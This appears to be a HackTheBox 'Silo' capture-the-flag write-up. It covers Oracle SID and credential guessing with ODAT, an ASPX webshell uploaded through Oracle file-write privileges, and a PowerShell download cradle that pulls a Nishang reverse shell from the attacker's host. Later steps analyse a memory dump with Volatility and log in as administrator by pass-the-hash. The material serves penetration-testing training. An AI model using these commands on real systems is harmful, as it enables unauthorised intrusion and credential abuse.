---
title: "Silo"
date: 2024-07-28
draft: false
description: "HackTheBox Silo writeup"
tags: ["hackthebox", "htb", "windows", "medium"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Silo

## Overview

- **OS:** Windows
- **IP:** 10.10.10.82
- **Difficulty:** Medium
- **Platform:** HackTheBox
- **OSCP:** No
- **Lists:** N/A

### Summary

odat , volatility , nishang shell ,nmap script for ssid bruteforce.

[https://www.notion.so](https://www.notion.so)

## Enumeration

nmap scan results 

{{< figure src="image 1084.png" >}}

{{< figure src="image 1085.png" >}}


## Vulnerabilities
## Exploitation


lets download ODAT

[https://github.com/quentinhardy/odat](https://github.com/quentinhardy/odat)

{{< figure src="image 1086.png" >}}

so what im gonna do is clone this rep with git clone and try to directly run the [odat.py](http://odat.py) file

{{< figure src="image 1087.png" >}}

{{< figure src="image 1088.png" >}}

{{< figure src="image 1089.png" >}}

{{< figure src="image 1090.png" >}}

lets do this to fix it

```python
    pip3 uninstall crypto
    pip3 uninstall pycrypto
    pip3 install pycryptodome
```

{{< figure src="image 1091.png" >}}

and it works now

{{< figure src="image 1092.png" >}}

lets guess the sid first with this command

└─$ python3 [odat.py](http://odat.py/) sidguesser -s 10.10.10.82 -p 1521

ok so when i used odat i was getting a bunch of false positives i dont know why

{{< figure src="image 1093.png" >}}

lets try using a nmap script

{{< figure src="image 1094.png" >}}

we got our SID as XE

ok so when we check the options for password guesser we see that accounts.txt is being used to grab default creds.

{{< figure src="image 1095.png" >}}

{{< figure src="image 1096.png" >}}

the content seems to be all lowercase , oracle is case sensitive now so we will have to use a updated wordlist , lets use the one which metasploit uses

{{< figure src="image 1097.png" >}}

{{< figure src="image 1098.png" >}}

{{< figure src="image 1099.png" >}}

we will have tof format this list a bit because when we compare it to the prev one we see that the user and pass are separated by a / which here is not the case.

{{< figure src="image 1100.png" >}}

this fixes it for us, now we can try guessing the password

{{< figure src="image 1101.png" >}}

ok nice we got our valid creds which is scott/tiger 

now lets use these creds

sqlplus64 scott/tiger@10.10.10.82:1521/XE

{{< figure src="image 1102.png" >}}

{{< figure src="image 1103.png" >}}

{{< figure src="image 1104.png" >}}

lets check our users privilege

{{< figure src="image 1105.png" >}}

ok so we seem to have only connect nd resource privs 

using odat we can escalate our priv with the —sysdba flag and then make use of the file —putFile flag to upload a revshell.aspx, as iis usually supports aspx

then we will visit the directory with our rev shell nd get our shell 

└─$ python3 [odat.py](http://odat.py/) utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile C:\\inetpub\\wwwroot  muq.aspx muq.aspx --sysdba

{{< figure src="image 1106.png" >}}

{{< figure src="image 1107.png" >}}

now lets visit the page

{{< figure src="image 1108.png" >}}

lets get our rev shell from here

lets get our nishang shell from here

[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

add this line to call it from the bott. of the file

tail -1 Invoke-PowerShellTcp.ps1

{{< figure src="image 1109.png" >}}

{{< figure src="image 1110.png" >}}

{{< figure src="image 1111.png" >}}

now lets use the webshell to provoke it

typing this in the webshell, gives us our shell

powershell IEX(New-Object Net.WebClient).downloadString('[http://10.10.14.31:8000/nish.ps1](http://10.10.14.31:8000/nish.ps1)')

{{< figure src="image 1112.png" >}}

and boom we have our  user flag

now lets try for the root flag

there was one more file which was some issue.txt , lets check that out

{{< figure src="image 1113.png" >}}

ok so this password did not work at all , there is a ? at the start of the password maybe we are not viewing it properly.

lets try the same command on our webshell

{{< figure src="image 1114.png" >}}

yep the character is diff , lets try this now

{{< figure src="image 1115.png" >}}

alr so we got a memory dump

lets get our os version first for our profile

systeminfo **|** findstr /B /C:"OS Name" /C:"OS Version"

{{< figure src="image 1116.png" >}}

[https://github.com/volatilityfoundation/volatility3.git](https://github.com/volatilityfoundation/volatility3.git)

then we clone volatility from there

python3 [vol.py](http://vol.py/) -f ~/Downloads/SILO-20180105-221806.dmp [windows.info](http://windows.info/)

{{< figure src="image 1117.png" >}}

we are not getting proper info from this version of volatility or maybe i am using it wrong

lets try with volatility 2

```
    git clone https://github.com/volatilityfoundation/volatility.git
    
    cd volatility
    
    python2 setup.py install
```

now lets run volatility 2 with 

python2 [vol.py](http://vol.py/) -f ~/Downloads/SILO-20180105-221806.dmp imageinfo

i kept getting a bunch of import errors , i solved that by running these 

sudo apt-get install python2.7-dev

pip2 install pycryptodome

pip2 install distorm3

running 

python2 [vol.py](http://vol.py/) -f ~/Downloads/SILO-20180105-221806.dmp imageinfo

gives us

Suggested Profile(s) : Win2016x64_14393, Win8SP0x64, Win10x64_17134, Win81U1x64, Win10x64_10240_17770, Win10x64_18362, Win10x64_14393, Win10x64, Win2012R2x64_18340, Win10x64_16299, Win2012R2x64, Win10x64_19041, Win2012x64, Win10x64_17763, Win8SP1x64_18340, Win10x64_10586, Win8SP1x64, Win10x64_15063 (Instantiated with Win10x64_15063)
AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)
AS Layer3 : FileAddressSpace (/home/kali/Downloads/SILO-20180105-221806.dmp)
PAE type : No PAE
DTB : 0x1a7000L
KDBG : 0xf80078520a30L
Number of Processors : 2
Image Type (Service Pack) : 0
KPCR for CPU 0 : 0xfffff8007857b000L
KPCR for CPU 1 : 0xffffd000207e8000L
KUSER_SHARED_DATA : 0xfffff78000000000L
Image date and time : 2018-01-05 22:18:07 UTC+0000
Image local date and time : 2018-01-05 22:18:07 +0000

we will use the WIN2012 profile

lets run this now and check our ps tree 

python2 [vol.py](http://vol.py/) -f ~/Downloads/SILO-20180105-221806.dmp --profile Win2012R2x64 pstree

{{< figure src="image 1118.png" >}}

{{< figure src="image 1119.png" >}}

hashdump returns us this

{{< figure src="image 1120.png" >}}

pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 [//10.10.10.82](https://10.10.10.82/) cmd

this gives us our shell, with which we can easily get the root flag

{{< figure src="image 1121.png" >}}
